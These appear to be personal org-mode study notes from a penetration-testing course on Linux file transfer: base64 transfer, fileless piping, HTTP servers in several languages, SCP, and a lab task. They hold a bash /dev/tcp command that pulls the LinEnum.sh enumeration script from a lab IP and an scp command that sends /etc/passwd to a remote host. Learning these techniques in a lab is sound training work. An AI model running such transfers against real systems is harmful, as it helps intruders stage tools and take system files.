:PROPERTIES:
:ID:       03a78f40-a19f-433d-a28f-65cd012abdf3
:END:
#+title: linux ft
#+OPTIONS: toc:2

* TOC :toc:
- [[#download-operations][Download Operations]]
  - [[#base64-encoding--decoding][Base64 Encoding / Decoding]]
  - [[#fileless-attacks][Fileless attacks]]
  - [[#down-with-python][Down with python]]
  - [[#download-with-bash-devtcp][Download with Bash (/dev/tcp)]]
  - [[#ssh][SSH]]
- [[#upload-operations][Upload Operations]]
  - [[#uploadserver-for-https][uploadserver for HTTPS]]
  - [[#alternative-ft-methods][Alternative FT Methods]]
  - [[#scp-upload][SCP Upload]]
- [[#lab][LAB]]
  - [[#q-download-the-file-flagtxt-from-the-web-root-using-python-from-the-pwnbox-submit-the-contents-of-the-file-as-your-answer][Q) Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer.]]
  - [[#use-gunzip--s-zip][Use gunzip -S .zip]]

* Download Operations
** Base64 Encoding / Decoding
doesnt require net.

#+begin_quote
encode file to base64 str, copy content and perform reverse operation
#+end_quote

*** Decode 
#+begin_src bash
base64 -d # decodes hash
#+end_src

** Fileless attacks
- Note taken on [2026-04-27 Mon 19:07] \\
  # Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.
  
Most linux tools can replicate fileless operations (because of how [[https://www.geeksforgeeks.org/linux-unix/piping-in-unix-or-linux/][pipes work]])

** Down with python
- requests
** Download with Bash (/dev/tcp)
+ bash -v >= 2.04 (compiled c --enable-net-redirections)

#+begin_src bash
# connect target webserver
biscuitrescue@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
# HTTP GET req
biscuitrescue@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
# Print final response
biscuitrescue@htb[/htb]$ cat <&3
#+end_src

** SSH
- Impl comes c =SCP= (secure copy) util for remote file transfer
- similar to cp but need to specify =username, remote IP/DNS, user creds=
  
*** Checking for SSH Listening port
~netstat -lnp~

*** down using SCP
#+begin_src bash
biscuitrescue@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt .
#+end_src>

* Upload Operations
- =uploadserver= -> extended module of =HTTP.Server=
** uploadserver for HTTPS
*** create self signed cert
1. create self signed cert
2. start
3. upload multiple files
** Alternative FT Methods
1. py -> =python3 -m http.server=
2. py2 -> =python2.7 -m SimpleHTTPServer=
3. php -> =php -S 0.0.0.0:8000=
4. ruby -> =ruby -run -ehttpd . -p8000=

+ then wget
** SCP Upload
if ssh -> scp to upload files
#+begin_src bash
biscuitrescue@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
#+end_src


* LAB
** TODO Q) Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer.
- wget http://10.129.234.168/flag.txt
- how to w python
** Use gunzip -S .zip
